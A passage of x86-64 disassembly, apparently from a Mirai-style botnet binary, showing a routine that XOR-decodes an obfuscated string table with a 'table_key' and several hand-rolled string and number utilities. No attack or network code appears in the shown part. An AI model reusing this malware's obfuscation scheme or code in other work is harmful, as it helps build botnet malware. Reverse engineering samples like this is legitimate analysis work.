  4073e6: 48 89 c2                     	mov	rdx, rax
  4073e9: 48 c1 e2 04                  	shl	rdx, 0x4
  4073ed: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  4073f1: 48 89 82 e0 b2 51 00         	mov	qword ptr [rdx + 0x51b2e0], rax
  4073f8: 0f b6 55 ec                  	movzx	edx, byte ptr [rbp - 0x14]
  4073fc: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  4073ff: 89 c1                        	mov	ecx, eax
  407401: 48 63 c2                     	movsxd	rax, edx
  407404: 48 c1 e0 04                  	shl	rax, 0x4
  407408: 66 89 88 e8 b2 51 00         	mov	word ptr [rax + 0x51b2e8], cx
  40740f: c9                           	leave
  407410: c3                           	ret

0000000000407411 <toggle_obf>:
  407411: 55                           	push	rbp
  407412: 48 89 e5                     	mov	rbp, rsp
  407415: 40 88 7d dc                  	mov	byte ptr [rbp - 0x24], dil
  407419: c7 45 ec 00 00 00 00         	mov	dword ptr [rbp - 0x14], 0x0
  407420: 0f b6 45 dc                  	movzx	eax, byte ptr [rbp - 0x24]
  407424: 48 c1 e0 04                  	shl	rax, 0x4
  407428: 48 05 e0 b2 51 00            	add	rax, 0x51b2e0
  40742e: 48 89 45 f0                  	mov	qword ptr [rbp - 0x10], rax
  407432: 8b 05 78 d6 10 00            	mov	eax, dword ptr [rip + 0x10d678] # 0x514ab0 <table_key>
  407438: 88 45 fc                     	mov	byte ptr [rbp - 0x4], al
  40743b: 8b 05 6f d6 10 00            	mov	eax, dword ptr [rip + 0x10d66f] # 0x514ab0 <table_key>
  407441: c1 e8 08                     	shr	eax, 0x8
  407444: 88 45 fd                     	mov	byte ptr [rbp - 0x3], al
  407447: 8b 05 63 d6 10 00            	mov	eax, dword ptr [rip + 0x10d663] # 0x514ab0 <table_key>
  40744d: c1 e8 10                     	shr	eax, 0x10
  407450: 88 45 fe                     	mov	byte ptr [rbp - 0x2], al
  407453: 8b 05 57 d6 10 00            	mov	eax, dword ptr [rip + 0x10d657] # 0x514ab0 <table_key>
  407459: c1 e8 18                     	shr	eax, 0x18
  40745c: 88 45 ff                     	mov	byte ptr [rbp - 0x1], al
  40745f: c7 45 ec 00 00 00 00         	mov	dword ptr [rbp - 0x14], 0x0
  407466: e9 af 00 00 00               	jmp	0x40751a <toggle_obf+0x109>
  40746b: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  40746f: 48 8b 10                     	mov	rdx, qword ptr [rax]
  407472: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  407475: 48 98                        	cdqe
  407477: 48 8d 0c 02                  	lea	rcx, [rdx + rax]
  40747b: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  40747f: 48 8b 10                     	mov	rdx, qword ptr [rax]
  407482: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  407485: 48 98                        	cdqe
  407487: 48 8d 04 02                  	lea	rax, [rdx + rax]
  40748b: 0f b6 10                     	movzx	edx, byte ptr [rax]
  40748e: 0f b6 45 fc                  	movzx	eax, byte ptr [rbp - 0x4]
  407492: 31 d0                        	xor	eax, edx
  407494: 88 01                        	mov	byte ptr [rcx], al
  407496: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  40749a: 48 8b 10                     	mov	rdx, qword ptr [rax]
  40749d: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  4074a0: 48 98                        	cdqe
  4074a2: 48 8d 0c 02                  	lea	rcx, [rdx + rax]
  4074a6: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4074aa: 48 8b 10                     	mov	rdx, qword ptr [rax]
  4074ad: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  4074b0: 48 98                        	cdqe
  4074b2: 48 8d 04 02                  	lea	rax, [rdx + rax]
  4074b6: 0f b6 10                     	movzx	edx, byte ptr [rax]
  4074b9: 0f b6 45 fd                  	movzx	eax, byte ptr [rbp - 0x3]
  4074bd: 31 d0                        	xor	eax, edx
  4074bf: 88 01                        	mov	byte ptr [rcx], al
  4074c1: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4074c5: 48 8b 10                     	mov	rdx, qword ptr [rax]
  4074c8: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  4074cb: 48 98                        	cdqe
  4074cd: 48 8d 0c 02                  	lea	rcx, [rdx + rax]
  4074d1: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4074d5: 48 8b 10                     	mov	rdx, qword ptr [rax]
  4074d8: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  4074db: 48 98                        	cdqe
  4074dd: 48 8d 04 02                  	lea	rax, [rdx + rax]
  4074e1: 0f b6 10                     	movzx	edx, byte ptr [rax]
  4074e4: 0f b6 45 fe                  	movzx	eax, byte ptr [rbp - 0x2]
  4074e8: 31 d0                        	xor	eax, edx
  4074ea: 88 01                        	mov	byte ptr [rcx], al
  4074ec: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4074f0: 48 8b 10                     	mov	rdx, qword ptr [rax]
  4074f3: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  4074f6: 48 98                        	cdqe
  4074f8: 48 8d 0c 02                  	lea	rcx, [rdx + rax]
  4074fc: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  407500: 48 8b 10                     	mov	rdx, qword ptr [rax]
  407503: 8b 45 ec                     	mov	eax, dword ptr [rbp - 0x14]
  407506: 48 98                        	cdqe
  407508: 48 8d 04 02                  	lea	rax, [rdx + rax]
  40750c: 0f b6 10                     	movzx	edx, byte ptr [rax]
  40750f: 0f b6 45 ff                  	movzx	eax, byte ptr [rbp - 0x1]
  407513: 31 d0                        	xor	eax, edx
  407515: 88 01                        	mov	byte ptr [rcx], al
  407517: ff 45 ec                     	inc	dword ptr [rbp - 0x14]
  40751a: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  40751e: 8b 40 08                     	mov	eax, dword ptr [rax + 0x8]
  407521: 0f b7 c0                     	movzx	eax, ax
  407524: 3b 45 ec                     	cmp	eax, dword ptr [rbp - 0x14]
  407527: 0f 8f 3e ff ff ff            	jg	0x40746b <toggle_obf+0x5a>
  40752d: c9                           	leave
  40752e: c3                           	ret
  40752f: 90                           	nop

0000000000407530 <util_strlen>:
  407530: 55                           	push	rbp
  407531: 48 89 e5                     	mov	rbp, rsp
  407534: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  407538: c7 45 fc 00 00 00 00         	mov	dword ptr [rbp - 0x4], 0x0
  40753f: eb 03                        	jmp	0x407544 <util_strlen+0x14>
  407541: ff 45 fc                     	inc	dword ptr [rbp - 0x4]
  407544: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  407548: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40754b: 84 c0                        	test	al, al
  40754d: 0f 95 c0                     	setne	al
  407550: 48 ff 45 e8                  	inc	qword ptr [rbp - 0x18]
  407554: 84 c0                        	test	al, al
  407556: 75 e9                        	jne	0x407541 <util_strlen+0x11>
  407558: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  40755b: c9                           	leave
  40755c: c3                           	ret

000000000040755d <util_strncmp>:
  40755d: 55                           	push	rbp
  40755e: 48 89 e5                     	mov	rbp, rsp
  407561: 48 83 ec 28                  	sub	rsp, 0x28
  407565: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  407569: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  40756d: 89 55 dc                     	mov	dword ptr [rbp - 0x24], edx
  407570: 48 8b 7d e8                  	mov	rdi, qword ptr [rbp - 0x18]
  407574: e8 b7 ff ff ff               	call	0x407530 <util_strlen>
  407579: 89 45 f8                     	mov	dword ptr [rbp - 0x8], eax
  40757c: 48 8b 7d e0                  	mov	rdi, qword ptr [rbp - 0x20]
  407580: e8 ab ff ff ff               	call	0x407530 <util_strlen>
  407585: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  407588: 8b 45 f8                     	mov	eax, dword ptr [rbp - 0x8]
  40758b: 3b 45 dc                     	cmp	eax, dword ptr [rbp - 0x24]
  40758e: 7c 08                        	jl	0x407598 <util_strncmp+0x3b>
  407590: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  407593: 3b 45 dc                     	cmp	eax, dword ptr [rbp - 0x24]
  407596: 7d 31                        	jge	0x4075c9 <util_strncmp+0x6c>
  407598: c7 45 d8 00 00 00 00         	mov	dword ptr [rbp - 0x28], 0x0
  40759f: eb 38                        	jmp	0x4075d9 <util_strncmp+0x7c>
  4075a1: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  4075a5: 0f b6 10                     	movzx	edx, byte ptr [rax]
  4075a8: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  4075ac: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4075af: 38 c2                        	cmp	dl, al
  4075b1: 0f 95 c0                     	setne	al
  4075b4: 48 ff 45 e8                  	inc	qword ptr [rbp - 0x18]
  4075b8: 48 ff 45 e0                  	inc	qword ptr [rbp - 0x20]
  4075bc: 84 c0                        	test	al, al
  4075be: 74 09                        	je	0x4075c9 <util_strncmp+0x6c>
  4075c0: c7 45 d8 00 00 00 00         	mov	dword ptr [rbp - 0x28], 0x0
  4075c7: eb 10                        	jmp	0x4075d9 <util_strncmp+0x7c>
  4075c9: ff 4d dc                     	dec	dword ptr [rbp - 0x24]
  4075cc: 83 7d dc ff                  	cmp	dword ptr [rbp - 0x24], -0x1
  4075d0: 75 cf                        	jne	0x4075a1 <util_strncmp+0x44>
  4075d2: c7 45 d8 01 00 00 00         	mov	dword ptr [rbp - 0x28], 0x1
  4075d9: 8b 45 d8                     	mov	eax, dword ptr [rbp - 0x28]
  4075dc: c9                           	leave
  4075dd: c3                           	ret

00000000004075de <util_strcmp>:
  4075de: 55                           	push	rbp
  4075df: 48 89 e5                     	mov	rbp, rsp
  4075e2: 48 83 ec 28                  	sub	rsp, 0x28
  4075e6: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  4075ea: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  4075ee: 48 8b 7d e8                  	mov	rdi, qword ptr [rbp - 0x18]
  4075f2: e8 39 ff ff ff               	call	0x407530 <util_strlen>
  4075f7: 89 45 f8                     	mov	dword ptr [rbp - 0x8], eax
  4075fa: 48 8b 7d e0                  	mov	rdi, qword ptr [rbp - 0x20]
  4075fe: e8 2d ff ff ff               	call	0x407530 <util_strlen>
  407603: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  407606: 8b 45 f8                     	mov	eax, dword ptr [rbp - 0x8]
  407609: 3b 45 fc                     	cmp	eax, dword ptr [rbp - 0x4]
  40760c: 74 31                        	je	0x40763f <util_strcmp+0x61>
  40760e: c7 45 dc 00 00 00 00         	mov	dword ptr [rbp - 0x24], 0x0
  407615: eb 38                        	jmp	0x40764f <util_strcmp+0x71>
  407617: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  40761b: 0f b6 10                     	movzx	edx, byte ptr [rax]
  40761e: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  407622: 0f b6 00                     	movzx	eax, byte ptr [rax]
  407625: 38 c2                        	cmp	dl, al
  407627: 0f 95 c0                     	setne	al
  40762a: 48 ff 45 e8                  	inc	qword ptr [rbp - 0x18]
  40762e: 48 ff 45 e0                  	inc	qword ptr [rbp - 0x20]
  407632: 84 c0                        	test	al, al
  407634: 74 09                        	je	0x40763f <util_strcmp+0x61>
  407636: c7 45 dc 00 00 00 00         	mov	dword ptr [rbp - 0x24], 0x0
  40763d: eb 10                        	jmp	0x40764f <util_strcmp+0x71>
  40763f: ff 4d f8                     	dec	dword ptr [rbp - 0x8]
  407642: 83 7d f8 ff                  	cmp	dword ptr [rbp - 0x8], -0x1
  407646: 75 cf                        	jne	0x407617 <util_strcmp+0x39>
  407648: c7 45 dc 01 00 00 00         	mov	dword ptr [rbp - 0x24], 0x1
  40764f: 8b 45 dc                     	mov	eax, dword ptr [rbp - 0x24]
  407652: c9                           	leave
  407653: c3                           	ret

0000000000407654 <util_strcpy>:
  407654: 55                           	push	rbp
  407655: 48 89 e5                     	mov	rbp, rsp
  407658: 48 83 ec 20                  	sub	rsp, 0x20
  40765c: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  407660: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  407664: 48 8b 7d e0                  	mov	rdi, qword ptr [rbp - 0x20]
  407668: e8 c3 fe ff ff               	call	0x407530 <util_strlen>
  40766d: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  407670: 8b 55 fc                     	mov	edx, dword ptr [rbp - 0x4]
  407673: ff c2                        	inc	edx
  407675: 48 8b 75 e0                  	mov	rsi, qword ptr [rbp - 0x20]
  407679: 48 8b 7d e8                  	mov	rdi, qword ptr [rbp - 0x18]
  40767d: e8 44 00 00 00               	call	0x4076c6 <util_memcpy>
  407682: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  407685: c9                           	leave
  407686: c3                           	ret

0000000000407687 <util_strcat>:
  407687: 55                           	push	rbp
  407688: 48 89 e5                     	mov	rbp, rsp
  40768b: 48 89 7d f8                  	mov	qword ptr [rbp - 0x8], rdi
  40768f: 48 89 75 f0                  	mov	qword ptr [rbp - 0x10], rsi
  407693: eb 04                        	jmp	0x407699 <util_strcat+0x12>
  407695: 48 ff 45 f8                  	inc	qword ptr [rbp - 0x8]
  407699: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  40769d: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4076a0: 84 c0                        	test	al, al
  4076a2: 75 f1                        	jne	0x407695 <util_strcat+0xe>
  4076a4: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4076a8: 0f b6 10                     	movzx	edx, byte ptr [rax]
  4076ab: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  4076af: 88 10                        	mov	byte ptr [rax], dl
  4076b1: 48 ff 45 f8                  	inc	qword ptr [rbp - 0x8]
  4076b5: 48 ff 45 f0                  	inc	qword ptr [rbp - 0x10]
  4076b9: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4076bd: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4076c0: 84 c0                        	test	al, al
  4076c2: 75 e0                        	jne	0x4076a4 <util_strcat+0x1d>
  4076c4: c9                           	leave
  4076c5: c3                           	ret

00000000004076c6 <util_memcpy>:
  4076c6: 55                           	push	rbp
  4076c7: 48 89 e5                     	mov	rbp, rsp
  4076ca: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  4076ce: 48 89 75 e0                  	mov	qword ptr [rbp - 0x20], rsi
  4076d2: 89 55 dc                     	mov	dword ptr [rbp - 0x24], edx
  4076d5: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  4076d9: 48 89 45 f0                  	mov	qword ptr [rbp - 0x10], rax
  4076dd: 48 8b 45 e0                  	mov	rax, qword ptr [rbp - 0x20]
  4076e1: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
  4076e5: eb 15                        	jmp	0x4076fc <util_memcpy+0x36>
  4076e7: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  4076eb: 0f b6 10                     	movzx	edx, byte ptr [rax]
  4076ee: 48 8b 45 f0                  	mov	rax, qword ptr [rbp - 0x10]
  4076f2: 88 10                        	mov	byte ptr [rax], dl
  4076f4: 48 ff 45 f0                  	inc	qword ptr [rbp - 0x10]
  4076f8: 48 ff 45 f8                  	inc	qword ptr [rbp - 0x8]
  4076fc: ff 4d dc                     	dec	dword ptr [rbp - 0x24]
  4076ff: 83 7d dc ff                  	cmp	dword ptr [rbp - 0x24], -0x1
  407703: 75 e2                        	jne	0x4076e7 <util_memcpy+0x21>
  407705: c9                           	leave
  407706: c3                           	ret

0000000000407707 <util_zero>:
  407707: 55                           	push	rbp
  407708: 48 89 e5                     	mov	rbp, rsp
  40770b: 48 89 7d e8                  	mov	qword ptr [rbp - 0x18], rdi
  40770f: 89 75 e4                     	mov	dword ptr [rbp - 0x1c], esi
  407712: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  407716: 48 89 45 f8                  	mov	qword ptr [rbp - 0x8], rax
  40771a: eb 0b                        	jmp	0x407727 <util_zero+0x20>
  40771c: 48 8b 45 f8                  	mov	rax, qword ptr [rbp - 0x8]
  407720: c6 00 00                     	mov	byte ptr [rax], 0x0
  407723: 48 ff 45 f8                  	inc	qword ptr [rbp - 0x8]
  407727: ff 4d e4                     	dec	dword ptr [rbp - 0x1c]
  40772a: 83 7d e4 ff                  	cmp	dword ptr [rbp - 0x1c], -0x1
  40772e: 75 ec                        	jne	0x40771c <util_zero+0x15>
  407730: c9                           	leave
  407731: c3                           	ret

0000000000407732 <util_atoi>:
  407732: 55                           	push	rbp
  407733: 48 89 e5                     	mov	rbp, rsp
  407736: 48 83 ec 60                  	sub	rsp, 0x60
  40773a: 48 89 7d c8                  	mov	qword ptr [rbp - 0x38], rdi
  40773e: 89 75 c4                     	mov	dword ptr [rbp - 0x3c], esi
  407741: 48 c7 45 d8 00 00 00 00      	mov	qword ptr [rbp - 0x28], 0x0
  407749: c7 45 f4 00 00 00 00         	mov	dword ptr [rbp - 0xc], 0x0
  407750: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  407754: 0f b6 00                     	movzx	eax, byte ptr [rax]
  407757: 0f be c0                     	movsx	eax, al
  40775a: 89 45 e4                     	mov	dword ptr [rbp - 0x1c], eax
  40775d: 48 ff 45 c8                  	inc	qword ptr [rbp - 0x38]
  407761: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  407764: 0f be f8                     	movsx	edi, al
  407767: e8 c5 05 00 00               	call	0x407d31 <util_isspace>
  40776c: 85 c0                        	test	eax, eax
  40776e: 75 e0                        	jne	0x407750 <util_atoi+0x1e>
  407770: 83 7d e4 2d                  	cmp	dword ptr [rbp - 0x1c], 0x2d
  407774: 75 1a                        	jne	0x407790 <util_atoi+0x5e>
  407776: c7 45 f4 01 00 00 00         	mov	dword ptr [rbp - 0xc], 0x1
  40777d: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  407781: 0f b6 00                     	movzx	eax, byte ptr [rax]
  407784: 0f be c0                     	movsx	eax, al
  407787: 89 45 e4                     	mov	dword ptr [rbp - 0x1c], eax
  40778a: 48 ff 45 c8                  	inc	qword ptr [rbp - 0x38]
  40778e: eb 17                        	jmp	0x4077a7 <util_atoi+0x75>
  407790: 83 7d e4 2b                  	cmp	dword ptr [rbp - 0x1c], 0x2b
  407794: 75 11                        	jne	0x4077a7 <util_atoi+0x75>
  407796: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  40779a: 0f b6 00                     	movzx	eax, byte ptr [rax]
  40779d: 0f be c0                     	movsx	eax, al
  4077a0: 89 45 e4                     	mov	dword ptr [rbp - 0x1c], eax
  4077a3: 48 ff 45 c8                  	inc	qword ptr [rbp - 0x38]
  4077a7: 83 7d f4 00                  	cmp	dword ptr [rbp - 0xc], 0x0
  4077ab: 74 10                        	je	0x4077bd <util_atoi+0x8b>
  4077ad: c7 45 a8 00 00 00 00         	mov	dword ptr [rbp - 0x58], 0x0
  4077b4: c7 45 ac 00 00 00 80         	mov	dword ptr [rbp - 0x54], 0x80000000
  4077bb: eb 0e                        	jmp	0x4077cb <util_atoi+0x99>
  4077bd: c7 45 a8 ff ff ff ff         	mov	dword ptr [rbp - 0x58], 0xffffffff
  4077c4: c7 45 ac ff ff ff 7f         	mov	dword ptr [rbp - 0x54], 0x7fffffff
  4077cb: 48 8b 45 a8                  	mov	rax, qword ptr [rbp - 0x58]
  4077cf: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
  4077d3: 8b 45 c4                     	mov	eax, dword ptr [rbp - 0x3c]
  4077d6: 48 63 d0                     	movsxd	rdx, eax
  4077d9: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  4077dd: 48 89 d1                     	mov	rcx, rdx
  4077e0: ba 00 00 00 00               	mov	edx, 0x0
  4077e5: 48 f7 f1                     	div	rcx
  4077e8: 48 89 d0                     	mov	rax, rdx
  4077eb: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  4077ee: 8b 45 c4                     	mov	eax, dword ptr [rbp - 0x3c]
  4077f1: 48 63 d0                     	movsxd	rdx, eax
  4077f4: 48 8b 45 e8                  	mov	rax, qword ptr [rbp - 0x18]
  4077f8: 48 89 d1                     	mov	rcx, rdx
  4077fb: ba 00 00 00 00               	mov	edx, 0x0
  407800: 48 f7 f1                     	div	rcx
  407803: 48 89 45 e8                  	mov	qword ptr [rbp - 0x18], rax
  407807: 48 c7 45 d8 00 00 00 00      	mov	qword ptr [rbp - 0x28], 0x0
  40780f: c7 45 f8 00 00 00 00         	mov	dword ptr [rbp - 0x8], 0x0
  407816: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  407819: 0f be f8                     	movsx	edi, al
  40781c: e8 45 05 00 00               	call	0x407d66 <util_isdigit>
  407821: 85 c0                        	test	eax, eax
  407823: 74 06                        	je	0x40782b <util_atoi+0xf9>
  407825: 83 6d e4 30                  	sub	dword ptr [rbp - 0x1c], 0x30
  407829: eb 38                        	jmp	0x407863 <util_atoi+0x131>
  40782b: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  40782e: 0f be f8                     	movsx	edi, al
  407831: e8 c6 04 00 00               	call	0x407cfc <util_isalpha>
  407836: 85 c0                        	test	eax, eax
  407838: 0f 84 90 00 00 00            	je	0x4078ce <util_atoi+0x19c>
  40783e: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  407841: 0f be f8                     	movsx	edi, al
  407844: e8 8a 04 00 00               	call	0x407cd3 <util_isupper>
  407849: 85 c0                        	test	eax, eax
  40784b: 74 09                        	je	0x407856 <util_atoi+0x124>
  40784d: c7 45 b4 37 00 00 00         	mov	dword ptr [rbp - 0x4c], 0x37
  407854: eb 07                        	jmp	0x40785d <util_atoi+0x12b>
  407856: c7 45 b4 57 00 00 00         	mov	dword ptr [rbp - 0x4c], 0x57
  40785d: 8b 45 b4                     	mov	eax, dword ptr [rbp - 0x4c]
  407860: 29 45 e4                     	sub	dword ptr [rbp - 0x1c], eax
  407863: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  407866: 3b 45 c4                     	cmp	eax, dword ptr [rbp - 0x3c]
  407869: 7d 63                        	jge	0x4078ce <util_atoi+0x19c>
  40786b: 83 7d f8 00                  	cmp	dword ptr [rbp - 0x8], 0x0
  40786f: 78 1c                        	js	0x40788d <util_atoi+0x15b>
  407871: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  407875: 48 3b 45 e8                  	cmp	rax, qword ptr [rbp - 0x18]
  407879: 77 12                        	ja	0x40788d <util_atoi+0x15b>
  40787b: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  40787f: 48 3b 45 e8                  	cmp	rax, qword ptr [rbp - 0x18]
  407883: 75 11                        	jne	0x407896 <util_atoi+0x164>
  407885: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  407888: 3b 45 fc                     	cmp	eax, dword ptr [rbp - 0x4]
  40788b: 7e 09                        	jle	0x407896 <util_atoi+0x164>
  40788d: c7 45 f8 ff ff ff ff         	mov	dword ptr [rbp - 0x8], 0xffffffff
  407894: eb 22                        	jmp	0x4078b8 <util_atoi+0x186>
  407896: c7 45 f8 01 00 00 00         	mov	dword ptr [rbp - 0x8], 0x1
  40789d: 8b 45 c4                     	mov	eax, dword ptr [rbp - 0x3c]
  4078a0: 48 63 d0                     	movsxd	rdx, eax
  4078a3: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  4078a7: 48 0f af c2                  	imul	rax, rdx
  4078ab: 48 89 45 d8                  	mov	qword ptr [rbp - 0x28], rax
  4078af: 8b 45 e4                     	mov	eax, dword ptr [rbp - 0x1c]
  4078b2: 48 98                        	cdqe
  4078b4: 48 01 45 d8                  	add	qword ptr [rbp - 0x28], rax
  4078b8: 48 8b 45 c8                  	mov	rax, qword ptr [rbp - 0x38]
  4078bc: 0f b6 00                     	movzx	eax, byte ptr [rax]
  4078bf: 0f be c0                     	movsx	eax, al
  4078c2: 89 45 e4                     	mov	dword ptr [rbp - 0x1c], eax
  4078c5: 48 ff 45 c8                  	inc	qword ptr [rbp - 0x38]
  4078c9: e9 48 ff ff ff               	jmp	0x407816 <util_atoi+0xe4>
  4078ce: 83 7d f8 00                  	cmp	dword ptr [rbp - 0x8], 0x0
  4078d2: 79 2e                        	jns	0x407902 <util_atoi+0x1d0>
  4078d4: 83 7d f4 00                  	cmp	dword ptr [rbp - 0xc], 0x0
  4078d8: 74 10                        	je	0x4078ea <util_atoi+0x1b8>
  4078da: c7 45 b8 00 00 00 00         	mov	dword ptr [rbp - 0x48], 0x0
  4078e1: c7 45 bc 00 00 00 80         	mov	dword ptr [rbp - 0x44], 0x80000000
  4078e8: eb 0e                        	jmp	0x4078f8 <util_atoi+0x1c6>
  4078ea: c7 45 b8 ff ff ff ff         	mov	dword ptr [rbp - 0x48], 0xffffffff
  4078f1: c7 45 bc ff ff ff 7f         	mov	dword ptr [rbp - 0x44], 0x7fffffff
  4078f8: 48 8b 4d b8                  	mov	rcx, qword ptr [rbp - 0x48]
  4078fc: 48 89 4d d8                  	mov	qword ptr [rbp - 0x28], rcx
  407900: eb 0a                        	jmp	0x40790c <util_atoi+0x1da>
  407902: 83 7d f4 00                  	cmp	dword ptr [rbp - 0xc], 0x0
  407906: 74 04                        	je	0x40790c <util_atoi+0x1da>
  407908: 48 f7 5d d8                  	neg	qword ptr [rbp - 0x28]
  40790c: 48 8b 45 d8                  	mov	rax, qword ptr [rbp - 0x28]
  407910: c9                           	leave
  407911: c3                           	ret

0000000000407912 <util_itoa>:
  407912: 55                           	push	rbp
  407913: 48 89 e5                     	mov	rbp, rsp
  407916: 48 83 ec 60                  	sub	rsp, 0x60
  40791a: 89 7d bc                     	mov	dword ptr [rbp - 0x44], edi
  40791d: 89 75 b8                     	mov	dword ptr [rbp - 0x48], esi
  407920: 48 89 55 b0                  	mov	qword ptr [rbp - 0x50], rdx
  407924: 48 83 7d b0 00               	cmp	qword ptr [rbp - 0x50], 0x0
  407929: 75 0d                        	jne	0x407938 <util_itoa+0x26>
  40792b: 48 c7 45 a8 00 00 00 00      	mov	qword ptr [rbp - 0x58], 0x0
  407933: e9 e9 00 00 00               	jmp	0x407a21 <util_itoa+0x10f>
  407938: 83 7d bc 00                  	cmp	dword ptr [rbp - 0x44], 0x0
  40793c: 0f 84 c6 00 00 00            	je	0x407a08 <util_itoa+0xf6>
  407942: c7 45 f0 00 00 00 00         	mov	dword ptr [rbp - 0x10], 0x0
  407949: c7 45 f4 00 00 00 00         	mov	dword ptr [rbp - 0xc], 0x0
  407950: c7 45 f8 00 00 00 00         	mov	dword ptr [rbp - 0x8], 0x0
  407957: c7 45 f4 20 00 00 00         	mov	dword ptr [rbp - 0xc], 0x20
  40795e: c6 45 e1 00                  	mov	byte ptr [rbp - 0x1f], 0x0
  407962: 83 7d b8 0a                  	cmp	dword ptr [rbp - 0x48], 0xa
  407966: 75 17                        	jne	0x40797f <util_itoa+0x6d>
  407968: 83 7d bc 00                  	cmp	dword ptr [rbp - 0x44], 0x0
  40796c: 79 11                        	jns	0x40797f <util_itoa+0x6d>
  40796e: c7 45 f0 01 00 00 00         	mov	dword ptr [rbp - 0x10], 0x1
  407975: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  407978: f7 d8                        	neg	eax
  40797a: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  40797d: eb 57                        	jmp	0x4079d6 <util_itoa+0xc4>
  40797f: c7 45 f0 00 00 00 00         	mov	dword ptr [rbp - 0x10], 0x0
  407986: 8b 45 bc                     	mov	eax, dword ptr [rbp - 0x44]
  407989: 89 45 fc                     	mov	dword ptr [rbp - 0x4], eax
  40798c: eb 48                        	jmp	0x4079d6 <util_itoa+0xc4>
  40798e: 8b 55 b8                     	mov	edx, dword ptr [rbp - 0x48]
  407991: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
  407994: 89 d1                        	mov	ecx, edx
  407996: ba 00 00 00 00               	mov	edx, 0x0
  40799b: f7 f1                        	div	ecx
  40799d: 89 d0                        	mov	eax, edx
  40799f: 89 45 f8                     	mov	dword ptr [rbp - 0x8], eax
  4079a2: 83 7d f8 09                  	cmp	dword ptr [rbp - 0x8], 0x9
  4079a6: 7f 06                        	jg	0x4079ae <util_itoa+0x9c>
  4079a8: 83 45 f8 30                  	add	dword ptr [rbp - 0x8], 0x30
  4079ac: eb 04                        	jmp	0x4079b2 <util_itoa+0xa0>
  4079ae: 83 45 f8 37                  	add	dword ptr [rbp - 0x8], 0x37
  4079b2: 8b 4d f4                     	mov	ecx, dword ptr [rbp - 0xc]
  4079b5: 8b 45 f8                     	mov	eax, dword ptr [rbp - 0x8]
  4079b8: 89 c2                        	mov	edx, eax
  4079ba: 48 63 c1                     	movsxd	rax, ecx
  4079bd: 88 54 05 c0                  	mov	byte ptr [rbp + rax - 0x40], dl
  4079c1: 8b 55 b8                     	mov	edx, dword ptr [rbp - 0x48]
  4079c4: 8b 45 fc                     	mov	eax, dword ptr [rbp - 0x4]
